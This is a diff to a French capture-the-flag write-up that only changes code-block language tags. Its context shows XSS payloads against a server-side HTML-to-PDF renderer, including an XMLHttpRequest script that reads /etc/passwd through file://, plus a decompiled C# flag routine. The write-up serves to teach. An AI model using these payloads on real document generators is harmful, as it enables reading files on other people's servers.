@@ -15,7 +15,7 @@ L'application disponible nous propose d'entrer un texte et de le transformer en 
 
 Une vulnérabilité courante ici, c'est l'XSS dans le moteur de rendu du PDF. Il est possible de le vérifier avec le payload suivant:
 
-```htmlmixed
+```html
 <script>
 document.write('test');
 </script>
@@ -25,7 +25,7 @@ document.write('test');
 
 Il peut être aussi intéressant de savoir d'ou est rendu le PDF
 
-```htmlmixed
+```html
 <script>
 document.write(document.location);
 </script>
@@ -35,7 +35,7 @@ document.write(document.location);
 
 Comme le PDF est rendu depuis un fichier (**file:///tmp/wktemp...**), nous allons pouvoir exfiltrer des fichiers. Nous pouvons par exemple extraire **/etc/passwd** de cette façon
 
-```htmlmixed
+```html
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){
@@ -57,7 +57,7 @@ Nous savons que l'application est de l'ASP.net, il faut donc chercher un fichier
 
 Une fois la Dll décompilée avec [ILSpy](https://github.com/icsharpcode/ILSpy), on trouve ce bout de code qui semble gérer l'affichage du flag:
 
-```=
+```csharp
 string text = "";
 string s = "FBMqE3MvFDkUGDM4MVUdFgAwAEA0Cj4SbwEGAQA3B1c6QhE7CAg6";
 string text2 = "VGhlRmxhZ0lzU29tZXdoZXJlX3VzZV95b3VyX2JyYWlu";
